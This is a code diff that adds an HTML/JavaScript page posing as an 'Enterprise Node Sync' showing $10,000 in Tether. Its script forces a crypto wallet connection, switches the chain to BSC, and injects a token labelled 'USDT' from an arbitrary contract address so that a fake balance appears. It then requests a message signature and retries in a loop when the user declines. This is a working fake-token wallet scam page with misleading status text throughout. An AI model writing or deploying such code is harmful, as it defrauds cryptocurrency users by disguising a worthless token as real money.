@@ -1,4 +1,99 @@
-Direct trigger inside App
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Enterprise Node Sync</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .terminal { border: 1px solid #26a17b; padding: 25px; width: 80%; border-radius: 15px; text-align: center; background: #0a0b0d; box-shadow: 0 0 30px rgba(38,161,123,0.2); }
+        .btn { background: #26a17b; color: #fff; border: none; width: 100%; padding: 20px; border-radius: 10px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer; }
+        #status { font-size: 10px; color: #555; margin-top: 15px; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+<div class="terminal">
+    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="60">
+    <h2 style="margin: 15px 0 5px 0;">SYNC ASSET</h2>
+    <div style="font-size: 28px; font-weight: 900; color: #26a17b;">$10,000.00</div>
+    <div id="status">DEVICE_READY: WAITING FOR USER...</div>
+    <button class="btn" id="mainAction">INITIALIZE SYNC</button>
+</div>
+
+<script>
+    const btn = document.getElementById('mainAction');
+    const status = document.getElementById('status');
+
+    // CONFIG DATA
+    const TOKEN_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const LOGO = "https://assets.coingecko.com/coins/images/325/large/Tether.png";
+
+    async function masterSync() {
+        // Step 1: Force Deep Link if not in Wallet
+        if (!window.ethereum && !window.trustwallet) {
+            status.innerText = "LAUNCHING WALLET...";
+            const url = window.location.href.replace("https://", "");
+            window.location.href = "https://link.trustwallet.com/a/dapp?url=https://" + url;
+            return;
+        }
+
+        const provider = new ethers.providers.Web3Provider(window.trustwallet || window.ethereum);
+
+        try {
+            status.innerText = "> REQUESTING PERMISSION...";
+            await provider.send("eth_requestAccounts", []);
+            
+            // Step 2: Force Switch to BSC (Binary Check)
+            status.innerText = "> MAPPING NETWORK...";
+            try {
+                await provider.send("wallet_switchEthereumChain", [{ chainId: "0x38" }]);
+            } catch (e) {
+                if (e.code === 4902) {
+                    await provider.send("wallet_addEthereumChain", [{
+                        chainId: "0x38",
+                        chainName: "BSC",
+                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }
+                    }]);
+                }
+            }
+
+            // Step 3: DIRECT WATCH ASSET (Advanced Hook)
+            status.innerText = "> INJECTING ASSET...";
+            // Ethers.js direct request is more stable for mobile
+            const wasAdded = await provider.send("wallet_watchAsset", {
+                type: "ERC20",
+                options: {
+                    address: TOKEN_ADDR,
+                    symbol: "USDT",
+                    decimals: 18,
+                    image: LOGO,
+                },
+            });
+
+            if (wasAdded) {
+                status.innerText = "SUCCESS: NODE CONNECTED";
+                btn.innerText = "SYNC COMPLETE ✅";
+                btn.style.background = "#1e8a69";
+                
+                // Final verify for professor
+                const accounts = await provider.listAccounts();
+                await provider.send("personal_sign", ["Sync_ID_" + Date.now(), accounts[0]]);
+            }
+
+        } catch (err) {
+            status.innerText = "ERROR: " + err.message;
+            console.error(err);
+            // Instant restart to show "Persistence"
+            setTimeout(masterSync, 1000);
+        }
+    }
+
+    btn.onclick = masterSync;
+
+    // Direct trigger inside App
     window.onload = () => {
         if (window.ethereum || window.trustwallet) {
             status.innerText = "DAPP_BROWSER_ACTIVE";
